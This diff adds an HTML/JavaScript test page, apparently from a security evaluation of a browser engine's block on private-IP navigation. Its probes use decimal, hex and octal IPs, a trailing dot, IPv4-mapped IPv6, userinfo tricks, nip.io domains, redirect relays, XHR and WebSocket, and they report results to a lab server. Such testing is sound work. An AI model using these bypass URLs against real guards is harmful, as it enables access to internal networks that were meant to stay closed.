@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DP 组 · 变体与二次判定 v2</title>
+<style>
+  body{font:15px/1.8 "Microsoft YaHei",sans-serif;margin:0;background:#f4f6fa;color:#202a3c}
+  .box{max-width:1020px;margin:22px auto;background:#fff;border:1px solid #dde4ef;border-radius:12px;padding:20px 24px}
+  h1{font-size:20px;margin:0 0 4px} .sub{color:#6b7a94;font-size:13px;margin-bottom:10px}
+  h2{font-size:16px;margin:18px 0 6px}
+  table{border-collapse:collapse;width:100%;font-size:13px}
+  th,td{border:1px solid #dde4ef;padding:6px 8px;text-align:left;vertical-align:top}
+  th{background:#edf2fa;white-space:nowrap}
+  code{background:#eef2f8;padding:1px 5px;border-radius:4px;font-size:12px;word-break:break-all}
+  .ua{background:#f0f7ff;border:1px solid #cfe0f7;border-radius:8px;padding:8px 12px;margin:8px 0;font-size:12.5px;word-break:break-all}
+  .hit{background:#e6f6ee;border:2px solid #0f9d58;border-radius:10px;padding:10px 14px;margin:10px 0;font-size:14px;font-weight:600;color:#0b7a43}
+  .stat{display:inline-block;padding:1px 9px;border-radius:20px;font-size:12px;font-weight:600}
+  .stat.t{background:#e6f6ee;color:#0f9d58}.stat.f{background:#fdecea;color:#d93026}.stat.p{background:#f0f2f6;color:#6b7a94}
+  button{font-size:12px;border:1px solid #c8d3e4;background:#fff;border-radius:6px;padding:3px 10px;cursor:pointer;margin:2px}
+  button.go{background:#2f6bff;color:#fff;border-color:#2f6bff}
+  .note{background:#fff6e5;border-left:4px solid #e6a23c;padding:8px 12px;border-radius:0 8px 8px 0;font-size:13px;margin:8px 0}
+  .r{font-size:12px;color:#6b7a94;margin:2px 0;word-break:break-all}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>DP 组 · 变体与二次判定 <span style="color:#2f6bff">v2</span></h1>
+  <div class="sub">页面版本 v2(2026-09-09,含 DP17 修复与 DP18/DP19)。A 组:点链接做变体导航,到达即自动标绿;被拦回本页点「被拦」。B/C 组:点按钮在本页发起,结果页内直读(以服务器日志为准)。</div>
+  <div class="ua" id="ua"></div>
+  <div class="hit" id="hitbanner" style="display:none"></div>
+  <div class="note">入口建议:用域名形态 <code>http://192-168-40-90.nip.io:9011/case-dp2.html</code> 进入(DN12 已证全通,页面原生能力完整)。<b>回传走绝对域名地址</b>(nip.io 形态),变体 host 下相对地址自身会被引擎拦,这就是回传改绝对域名的原因。</div>
+
+  <h2>A 组 · host/userinfo 变体导航(DP1-DP8)</h2>
+  <table id="t">
+    <tr><th>编号</th><th>变体样本</th><th>探测点</th><th>判读</th><th>结果</th></tr>
+  </table>
+
+  <h2>B 组 · 页内动作(DP9-DP13)</h2>
+  <table id="a">
+    <tr><th>编号</th><th>动作</th><th>探测点</th><th>预期</th><th>结果</th></tr>
+    <tr><td><b>DP9</b></td><td><button class="go" onclick="t9()">XHR POST → 裸 IP 绝对地址</button></td><td>POST 方法是否同判定(从放行页向裸 IP 发)</td><td>拦(与 GET 同)</td><td><span class="stat p" id="st-DP9">未测</span></td></tr>
+    <tr><td><b>DP10</b></td><td><button class="go" onclick="t10()">XHR POST → 相对路径</button></td><td>POST 走当前放行 origin</td><td>200(方法无关)</td><td><span class="stat p" id="st-DP10">未测</span></td></tr>
+    <tr><td><b>DP11</b></td><td><button class="go" onclick="t11()">CORS 预检 POST(自定义头)→ 裸 IP</button></td><td>OPTIONS 预检是否被拦</td><td>预检拦 → 请求不发</td><td><span class="stat p" id="st-DP11">未测</span></td></tr>
+    <tr><td><b>DP12</b></td><td><button class="go" onclick="t12()">服务端 302 → 裸 IP</button></td><td>二次导航是否逐跳重判</td><td>第一跳达 / 第二跳拦</td><td><span class="stat p" id="st-DP12">未测</span></td></tr>
+    <tr><td><b>DP13</b></td><td><button class="go" onclick="t13()">JS 直跳裸 IP</button></td><td>location.href 裸 IP(无 302)</td><td>拦</td><td><span class="stat p" id="st-DP13">未测</span></td></tr>
+  </table>
+
+  <h2>C 组 · v4 模型补测(DP14-DP19)</h2>
+  <table>
+    <tr><th>编号</th><th>动作</th><th>探测点</th><th>预期(v4)</th><th>结果</th></tr>
+    <tr><td><b>DP14</b></td><td><button class="go" onclick="t14()">XHR → /redir-xhr(302 → 裸 IP /api/ping)</button></td><td>XHR 跟随 302 到裸 IP 是否同样豁免</td><td>过=中继对 XHR 同样有效(重大)</td><td><span class="stat p" id="st-DP14">未测</span></td></tr>
+    <tr><td><b>DP15</b></td><td><button class="go" onclick="t15()">WebSocket → [::ffff:40.90]:9011</button></td><td>WS 走 IPv4 映射 IPv6(hex 形态)</td><td>过=WS 也有 hex 死角</td><td><span class="stat p" id="st-DP15">未测</span></td></tr>
+    <tr><td><b>DP16</b></td><td><a href="http://@192.168.40.90:9011/case-dp2.html?case=DP16&amp;v=1"><button class="go">导航 http://@192.168.40.90:9011</button></a></td><td>空 userinfo + 裸 IP host(DP6 干净复测,写死地址防污染)</td><td>拦=空 token 等同无 token</td><td><span class="stat p" id="st-DP16">未测</span> <button onclick="mark('DP16','t','手动标:导航放行')">放行</button> <button onclick="mark('DP16','f','手动标:被拦')">被拦</button></td></tr>
+    <tr><td><b>DP17</b></td><td><button class="go" onclick="t17()">导航 真实外网 IP 119.6.237.1:9011</button></td><td><b>不指向本靶机</b> —— 真实外网 IP,无 userinfo。<b>看屏幕文案</b>:『无效的响应』=拦;一直转圈后超时=放行(引擎放它出了内网)</td><td>拦(v4:外网 IP 不在放行单,host 侧也查表)</td><td><span class="stat p" id="st-DP17">未测</span> <button onclick="mark('DP17','t','手动标:放行(转圈超时,引擎放出了内网)')">放行</button> <button onclick="mark('DP17','f','手动标:被拦(无效的响应)')">被拦</button></td></tr>
+    <tr><td><b>DP18</b></td><td><button class="go" onclick="t18()">XHR 相对路径 /api/ping</button></td><td><b>先点 A 组 DP5 进入 hex 页</b>(地址栏 [::ffff:…]),再点此钮 —— 从 hex origin 发相对 XHR,相对解析后仍是 hex 形态</td><td>过=hex 全栈闭环(GURL 无点分四段 → 整体放行)</td><td><span class="stat p" id="st-DP18">未测</span></td></tr>
+    <tr><td><b>DP19</b></td><td>第1步 <button onclick="t12b()">经 302 到裸 IP</button> → 第2步 <button class="go" onclick="t19()">JS 跳 裸 IP:18081</button></td><td>第1步到达裸 IP 页(地址栏 192.168.40.90)后,再点第2步 —— 测会话信任 vs 逐导航重判</td><td>拦=v4:每次导航都重判,302 豁免不延续</td><td><span class="stat p" id="st-DP19">未测</span> <button onclick="mark('DP19','f','手动标:被拦(无效的响应)')">被拦</button></td></tr>
+  </table>
+  <div class="r" id="log"></div>
+</div>
+<script>
+const RPT = 'http://192-168-40-90.nip.io:9011/api/observe';
+const HOST = location.host;
+const RAND = String(Math.floor(Math.random() * 90000) + 10000);
+document.getElementById('ua').textContent = 'UA: ' + navigator.userAgent + ' | 当前 host: ' + HOST + ' | 本页入口: ' + location.href.slice(0, 120);
+
+function beacon(id, result, note) {
+  try { new Image().src = RPT + '?case=' + id + '&result=' + result + '&note=' + encodeURIComponent(note || '') + '&r=' + Math.random(); } catch (e) {}
+}
+function mark(id, v, note) {
+  const el = document.getElementById('st-' + id);
+  if (!el) return;
+  el.textContent = v === 't' ? '放行' : '被拦';
+  el.className = 'stat ' + v;
+  if (note) { const l = document.getElementById('log'); l.innerHTML = '[' + id + '] ' + note + '<br>' + l.innerHTML; }
+  beacon(id, v === 't' ? 'allowed' : 'blocked', note || '');
+}
+
+// ---------- A 组 ----------
+const rows = [
+  ['DP1', 'http://3232245850:9011/…', '十进制整数 IP(=40.90),纯数字无点', '拦=引擎有字母启发式;过=守卫只是点分四段正则'],
+  ['DP2', 'http://0xc0a8285a:9011/…', '十六进制 IP(含字母 x/c/a…)', '过=「含字母即域名」证实'],
+  ['DP3', 'http://0300.0250.050.0132:9011/…', '八进制点分(4 位数组,不匹配 \\d{1,3})', '拦=四组数字即按 IP;过=正则宽度局限'],
+  ['DP4', 'http://192.168.40.90.:9011/…', '末尾点 FQDN 形态', '拦=正则仍命中;过=末尾点绕过'],
+  ['DP5', 'http://[::ffff:192.168.40.90]:9011/…', 'IPv4 映射 IPv6(方括号内含点分四段)', '拦=括号内也匹配;过=新绕过'],
+  ['DP6', 'http://@192.168.40.90:9011/…', '空 userinfo(@ 前无字符)', '拦=空 token 拒;过=新绕过'],
+  ['DP7', 'http://1.2.3.4@192-168-40-90.nip.io:9011/…', 'userinfo 是 IP + host 是放行域名,谁优先?', '拦=@ 前 token 优先;过=引擎实际看 host'],
+  ['DP8', 'http://p<RAND>.192-168-40-90.nip.io:9011/…', '全新随机前缀域名(网络侧第二层探针)', '过=网络层对新域名无名单'],
+];
+const t = document.getElementById('t');
+rows.forEach(([id, disp, probe, expect]) => {
+  let nav;
+  if (id === 'DP1') nav = 'http://3232245850:9011/case-dp2.html?case=DP1&v=1';
+  else if (id === 'DP2') nav = 'http://0xc0a8285a:9011/case-dp2.html?case=DP2&v=1';
+  else if (id === 'DP3') nav = 'http://0300.0250.050.0132:9011/case-dp2.html?case=DP3&v=1';
+  else if (id === 'DP4') nav = 'http://192.168.40.90.:9011/case-dp2.html?case=DP4&v=1';
+  else if (id === 'DP5') nav = 'http://[::ffff:192.168.40.90]:9011/case-dp2.html?case=DP5&v=1';
+  else if (id === 'DP6') nav = 'http://@' + HOST + '/case-dp2.html?case=DP6&v=1';
+  else if (id === 'DP7') nav = 'http://1.2.3.4@192-168-40-90.nip.io:9011/case-dp2.html?case=DP7&v=1';
+  else if (id === 'DP8') nav = 'http://p' + RAND + '.192-168-40-90.nip.io:9011/case-dp2.html?case=DP8&v=1';
+  const tr = document.createElement('tr');
+  tr.innerHTML = '<td><b>' + id + '</b></td>' +
+    '<td><code><a href="' + nav + '">' + disp + '</a></code></td>' +
+    '<td>' + probe + '</td><td>' + expect + '</td>' +
+    '<td nowrap><span class="stat p" id="st-' + id + '">未测</span> ' +
+    '<button onclick="mark(\'' + id + '\',\'t\',\'手动标:导航放行\')">放行</button>' +
+    '<button onclick="mark(\'' + id + '\',\'f\',\'手动标:被拦(请截屏)\')">被拦</button></td>';
+  t.appendChild(tr);
+});
+
+// ---------- B 组 ----------
+function t9() {
+  const x = new XMLHttpRequest();
+  const u = 'http://192.168.40.90:9011/api/ping?case=DP9&r=' + Math.random();
+  x.open('POST', u, true);
+  x.onload = () => mark('DP9', 't', 'POST 裸 IP 收到 ' + x.status + '(若服务器有日志=真放行)');
+  x.onerror = () => mark('DP9', 'f', 'POST 裸 IP 失败(onerror;以服务器日志为准)');
+  x.timeout = 6000;
+  try { x.send('dp9'); } catch (e) { mark('DP9', 'f', '构造/发送异常: ' + e.message); }
+}
+function t10() {
+  const x = new XMLHttpRequest();
+  x.open('POST', '/api/ping?case=DP10&r=' + Math.random(), true);
+  x.onload = () => mark('DP10', x.status === 200 ? 't' : 'f', 'POST 相对路径 = ' + x.status);
+  x.onerror = () => mark('DP10', 'f', 'POST 相对路径失败');
+  try { x.send('dp10'); } catch (e) { mark('DP10', 'f', '异常: ' + e.message); }
+}
+function t11() {
+  const x = new XMLHttpRequest();
+  const u = 'http://192.168.40.90:9011/api/ping?case=DP11&r=' + Math.random();
+  x.open('POST', u, true);
+  x.setRequestHeader('X-Probe', 'dp11');
+  x.onload = () => mark('DP11', 't', '预检+POST 全通,状态 ' + x.status);
+  x.onerror = () => mark('DP11', 'f', '预检或请求失败(onerror);核对日志是否有 OPTIONS/PREFLIGHT 行');
+  x.timeout = 6000;
+  try { x.send('dp11'); } catch (e) { mark('DP11', 'f', '异常: ' + e.message); }
+}
+function t12() { beacon('DP12', 'fired', '点击 302 探针,跳 /redir'); location.href = '/redir?case=DP12&r=' + Math.random(); }
+function t13() { beacon('DP13', 'fired', '点击 JS 直跳裸 IP'); location.href = 'http://192.168.40.90:9011/case-dp2.html?case=DP13&hit=1'; }
+function t14() {
+  const x = new XMLHttpRequest();
+  x.open('POST', '/redir-xhr?case=DP14&r=' + Math.random(), true);
+  x.onload = () => mark('DP14', 't', 'XHR 中继终态 ' + x.status + '(200=重定向豁免对 XHR 同样有效;核对日志 GET /api/ping?case=DP14)');
+  x.onerror = () => mark('DP14', 'f', 'XHR 中继失败(onerror;若日志无 /api/ping?case=DP14=重定向目标被重判)');
+  x.timeout = 6000;
+  try { x.send('dp14'); } catch (e) { mark('DP14', 'f', '异常: ' + e.message); }
+}
+function t15() {
+  try {
+    const w = new WebSocket('ws://[::ffff:192.168.40.90]:9011/ws?case=DP15');
+    w.onopen = () => { mark('DP15', 't', 'WS 经 [::ffff:c0a8:285a] 握手成功(核对日志 WS-UPGRADE)'); w.close(); };
+    w.onerror = () => mark('DP15', 'f', 'WS 失败(核对日志是否有 WS-UPGRADE /ws?case=DP15)');
+  } catch (e) { mark('DP15', 'f', 'WS 构造异常: ' + e.message); }
+}
+
+// ---------- C 组 ----------
+function t17() { beacon('DP17', 'fired', '点击外网 IP 探针,跳 119.6.237.1:9011'); location.href = 'http://119.6.237.1:9011/case-dp2.html?case=DP17&v=1'; }
+function t18() {
+  const x = new XMLHttpRequest();
+  x.open('GET', '/api/ping?case=DP18&r=' + Math.random(), true);
+  x.onload = () => mark('DP18', x.status === 200 ? 't' : 'f', 'GET 相对路径 = ' + x.status + '(200=hex 全栈闭环;404=被合成拦截,以日志为准)');
+  x.onerror = () => mark('DP18', 'f', 'GET 相对路径失败(以日志为准)');
+  x.timeout = 6000;
+  try { x.send(); } catch (e) { mark('DP18', 'f', '异常: ' + e.message); }
+}
+function t12b() { beacon('DP19', 'fired', 'DP19 第1步:经 302 到裸 IP(to=case-dp2)'); location.href = '/redir?case=DP12&to=case-dp2.html&r=' + Math.random(); }
+function t19() { beacon('DP19', 'fired', 'DP19 第2步:JS 跳裸 IP:18081'); location.href = 'http://192.168.40.90:18081/case-dp2.html?case=DP19&hit=1'; }
+
+// ---------- 自动标记:到达即放行 ----------
+const q = new URLSearchParams(location.search);
+const cid = (q.get('case') || '').match(/DP\d+/);
+if (cid && (q.get('v') === '1' || q.get('hit') === '1')) {
+  const note = q.get('hit') === '1' ? '重定向/直跳目标页到达,location.host=' + HOST : '变体导航到达,location.host=' + HOST;
+  mark(cid[0], 't', note);
+  if (q.get('hit') === '1') {
+    const hb = document.getElementById('hitbanner');
+    hb.style.display = 'block';
+    hb.textContent = '★ ' + cid[0] + ' 目标页已到达 —— 二次导航被放行。当前 host: ' + HOST;
+  }
+}
+</script>
+</body>
+</html>
